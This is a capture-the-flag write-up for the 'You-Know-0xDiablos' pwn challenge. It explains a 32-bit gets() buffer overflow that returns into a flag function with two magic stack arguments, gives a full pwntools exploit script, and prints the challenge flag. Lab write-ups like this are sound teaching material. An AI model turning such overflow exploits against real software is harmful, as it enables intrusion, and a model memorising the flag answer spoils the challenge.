---
title: "You-Know-0xDiablos"
ctf: "CTFs-Testing"
date: 2026-06-06
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
---

# You-Know-0xDiablos

## Summary

A ret2win challenge with a twist: the win function (`flag`) checks two magic arguments (`0xdeadbeef`, `0xc0ded00d`) before printing the flag. Classic `gets()` buffer overflow to redirect execution and supply the required parameters on the stack.

## Solution

### Step 1: Analyze binary

32-bit ELF, no PIE, no canary, NX disabled, `gets()` in `vuln()` overflows a buffer at `ebp-0xb8`. A `flag()` function at `0x080491e2` reads `flag.txt` but only prints it if `arg1 == 0xdeadbeef` and `arg2 == 0xc0ded00d`.

### Step 2: Exploit

Buffer is 184 bytes below `ebp`. Adding 4 bytes for saved `ebp` gives 188 bytes of padding to reach the return address. In 32-bit calling convention, arguments follow the return address on the stack, so we supply `flag_addr + dummy_ret + 0xdeadbeef + 0xc0ded00d`.

```python
from pwn import *
import sys

context.binary = ELF('./challenge/vuln')
context.log_level = 'info'

FLAG_ADDR = 0x080491e2
OFFSET = 0xb8 + 4  # buffer + saved ebp

def exploit(target):
    if target == 'local':
        io = process(context.binary.path, cwd='./challenge')
    else:
        host, port = target.split(':')
        io = remote(host, int(port))

    payload = flat({
        0: b'A' * OFFSET,
        OFFSET: [
            FLAG_ADDR,
            0x0,            # fake return after flag
            0xdeadbeef,     # arg1
            0xc0ded00d,     # arg2
        ]
    })

    io.recvuntil(b'0xDiablos:')
    io.sendline(payload)
    io.recvline()  # echo of our input from puts
    flag = io.recvall(timeout=5)
    print(f'FLAG: {flag.decode(errors="replace").strip()}')
    io.close()

if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'local')
```

## Flag

```
HTB{a40d3e128b0aa3c870a8323a2ab43aba}
```
